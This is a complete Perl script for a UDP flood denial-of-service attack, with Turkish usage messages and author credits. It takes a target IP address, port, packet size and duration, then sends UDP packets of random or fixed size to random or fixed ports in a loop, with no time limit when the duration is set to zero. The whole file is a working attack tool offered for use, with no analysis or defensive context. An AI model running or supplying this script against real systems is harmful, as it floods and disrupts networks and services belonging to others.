#!/usr/bin/perl

##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " GorkemBeyUDPSALDIRISCR?PT.pl <IP ADRESI> <PORT NUMARASI> <500> <500>\n\n";
  print " port=0: RASTGELE PORT NUMARASI AUTO\n";
  print " size=0: RASTGELE BOYUT KULLAN 64 ILE 15000000 ARASI\n";
  print " time=0: SURESIZ SALDIRI\n";
  print " Coder By *-GorkemBey-*\n";
  print " Coded By *-SAMET-*\n";
  
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "*-GORKEMBEY-* Attacking: $ip " . ($port ? $port : "random") . " PORT NUMARASI " . 
  ($size ? "$size-byte" : "random size") . " PAKET" . 
  ($time ? " for $time SURE" : "") . "\n";
print "SALDIRIYI DURDUR Ctrl-C\n" unless $time;
print " Coder By *-GorkemBey-*\n";
print " Coded By *-SAMET-*\n";
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}